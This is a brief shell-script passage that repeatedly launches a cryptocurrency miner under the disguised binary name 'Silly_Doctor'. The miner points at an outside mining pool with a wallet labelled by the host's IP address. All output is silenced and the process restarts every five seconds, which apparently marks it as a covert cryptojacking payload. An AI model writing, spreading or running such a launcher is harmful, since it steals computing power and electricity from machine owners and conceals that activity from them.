...
while true
do
./Silly_Doctor --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool us.epicmine.io:3333 --wallet gnikbaas.$underscored_ip --password m=pool --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
sleep 5
done
